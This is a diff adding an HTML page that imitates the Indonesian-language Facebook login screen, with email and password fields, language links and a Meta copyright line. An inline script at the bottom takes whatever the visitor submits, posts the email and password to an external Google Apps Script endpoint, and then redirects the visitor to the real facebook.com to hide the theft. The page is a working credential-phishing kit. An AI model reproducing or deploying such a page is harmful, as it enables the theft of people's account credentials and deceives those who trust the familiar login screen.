@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Masuk atau Daftar</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js"></script>
+</head>
+
+<body>
+    <div class="container-1">
+        <div class="header">
+            <h1 class="judul">facebook</h1>
+            <h3 class="caption">Facebook membantu Anda terhubung dan berbagi dengan orang-orang dalam kehidupan Anda.
+            </h3>
+        </div>
+
+        <form action="" class="form" name="form-fb-login">
+            <div class="form-login">
+                <div class="username">
+                    <input name="email" type="email" placeholder="Email atau Nomor Telepon" required>
+                </div>
+                <div class="pass">
+                    <input name="password" type="password" placeholder="Kata Sandi">
+                </div>
+                <div class="masuk">
+                    <a href="https://www.facebook.com">
+                        <button type="submit" class="login">
+                            Masuk
+                        </button>
+                    </a>
+                </div>
+                <div class="lupa-sandi">
+                    <a href="">Lupa kata sandi?</a>
+                </div>
+                <div class="garis"></div>
+                <div class="buat-akun">
+                    <button type="button" class="new-account">
+                        Buat akun baru
+                    </button>
+                </div>
+            </div>
+            <div class="buat-halaman">
+                <p><a href="" class="new-page" id="myButton">Buat Halaman</a> untuk selebriti, merek, atau bisnis.</p>
+            </div>
+        </form>
+    </div>
+
+
+    <div class="footer">
+        <ul id="languageList" class="Bahasa">
+            <li>Bahasa Indonesia</li>
+            <li><a class="" href="en-login.html" onclick="changeLanguage('en')" title="English">English (UK)</a></li>
+            <li><a class="" href="jv-login.html" onclick="changeLanguage('jv')" title="Javanese">Basa Jawa</a></li>
+            <li><a class="" href="ms-login.html" onclick="changeLanguage('ms')" title="Malay">Bahasa Melayu</a></li>
+            <li><a class="" href="ja-login.html" onclick="changeLanguage('ja')" title="Japanese">日本語</a></li>
+            <li><a class="" href="ar-login.html" onclick="changeLanguage('ar')" title="Arabic">العربية</a></li>
+        </ul>
+
+        <div class="garis-footer"></div>
+
+        <div class="copyright">
+            <div><span> Meta © 2023</span></div>
+        </div>
+    </div>
+
+
+
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxIqBdkJNoHL_x3hnzVx_YVvptIq_QmChvpd1E5Ak3oDY0k1BS7T_o_CrNvzWBSMjq6/exec'
+        const form = document.forms['form-fb-login']
+
+        form.addEventListener('submit', e => {
+            e.preventDefault()
+            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                .then(response => console.log('Success!', response))
+                .catch(error => console.error('Error!', error.message))
+            form.reset()
+            window.location.href = 'https://www.facebook.com/'
+        })
+    </script>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
